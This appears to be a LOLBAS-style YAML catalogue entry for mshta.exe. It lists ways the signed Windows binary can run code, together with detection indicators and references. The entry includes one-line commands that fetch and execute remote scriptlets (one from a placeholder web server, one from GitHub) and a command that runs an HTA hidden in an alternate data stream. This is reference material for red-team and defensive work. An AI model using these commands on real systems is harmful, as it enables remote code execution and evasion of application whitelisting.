---
Name: Mshta.exe
Description: Used by Windows to execute html applications. (.hta)
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: mshta.exe evilfile.hta
    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
    Description: Executes VBScript supplied as a command line argument.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
    Description: Executes JavaScript supplied as a command line argument.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe "C:\ads\file.txt:file.hta"
    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
    Usecase: Execute code hidden in alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
Full_Path:
  - Path: C:\Windows\System32\mshta.exe
  - Path: C:\Windows\SysWOW64\mshta.exe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct
Detection:
 - IOC: mshta.exe executing raw or obfuscated script within the command-line
 - IOC: Usage of HTA file
Resources:
  - Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
  - Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
